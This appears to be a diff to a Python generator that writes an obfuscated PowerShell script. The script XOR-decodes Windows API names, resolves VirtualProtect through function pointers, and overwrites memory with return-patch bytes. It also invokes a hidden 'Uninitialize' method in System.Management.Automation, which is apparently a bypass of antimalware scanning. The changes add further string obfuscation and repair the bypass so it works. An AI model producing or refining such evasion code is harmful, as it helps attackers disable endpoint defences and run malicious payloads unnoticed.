@@ -252,6 +252,10 @@ function {xb} {{
 [Byte[]] ${xg} = {xoredBytesG}
 [Byte[]] ${xi} = {xoredBytesI}
 [Byte[]] ${xj} = {xoredBytesJ}
+[Byte[]] ${xl} = {xoredBytesL}
+[Byte[]] ${xm} = {xoredBytesM}
+[Byte[]] ${xn} = {xoredBytesN}
+[Byte[]] ${xo} = {xoredBytesO}
 
 for($i=0; $i -lt ${xc}.count ; $i++)
 {{
@@ -281,7 +285,7 @@ for($i=0; $i -lt ${xf}.count ; $i++)
 
 $f = [System.Text.Encoding]::ASCII.GetString(${xf})
 $e = $e+$f
-$e
+
 for($i=0; $i -lt ${xi}.count ; $i++)
 {{
     ${xi}[$i] = ${xi}[$i] -bxor {xorkeyBytes}
@@ -304,13 +308,43 @@ for($i=0; $i -lt ${xj}.count ; $i++)
 $j = [System.Text.Encoding]::ASCII.GetString(${xj})
 $g = $g+$j
 
-${a} = {xa} $d LoadLibraryA
+for($i=0; $i -lt ${xl}.count ; $i++)
+{{
+    ${xl}[$i] = ${xl}[$i] -bxor {xorkeyBytes}
+}}
+
+$l = [System.Text.Encoding]::ASCII.GetString(${xl})
+
+for($i=0; $i -lt ${xm}.count ; $i++)
+{{
+    ${xm}[$i] = ${xm}[$i] -bxor {xorkeyBytes}
+}}
+
+$m = [System.Text.Encoding]::ASCII.GetString(${xm})
+$l = $l+$m
+
+for($i=0; $i -lt ${xn}.count ; $i++)
+{{
+    ${xn}[$i] = ${xn}[$i] -bxor {xorkeyBytes}
+}}
+
+$n = [System.Text.Encoding]::ASCII.GetString(${xn})
+
+for($i=0; $i -lt ${xo}.count ; $i++)
+{{
+    ${xo}[$i] = ${xo}[$i] -bxor {xorkeyBytes}
+}}
+
+$o = [System.Text.Encoding]::ASCII.GetString(${xo})
+$n = $n+$o
+
+${a} = {xa} $d $n
 ${b} = {xb} @([String]) ([IntPtr])
 ${c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${a},${b})
-${d} = {xa} $d GetProcAddress
+${d} = {xa} $d $l
 ${e} = {xb} @([IntPtr], [String]) ([IntPtr])
 ${f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d},${e})
-${g} = {xa} $d VirtualProtect
+${g} = {xa} $d $e
 ${h} = {xb} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 ${i} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${g},
 ${h})
@@ -320,8 +354,8 @@ $p = 0
 ${i}.Invoke(${j}, [uint32]6, 0x40, [ref]$p)
 ${k} = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy(${k}, 0, ${j}, 6)
-{l} = [Ref].Assembly.GetType('System.Management.Automation.'+$g)
-${m} = {l}.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
-${n}({l},$null)
+${l} = [Ref].Assembly.GetType('System.Management.Automation.'+$g)
+${m} = ${l}.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+${m}.Invoke(${l},$null)
 '''
 open("2.ps1", "w").write(amc2)
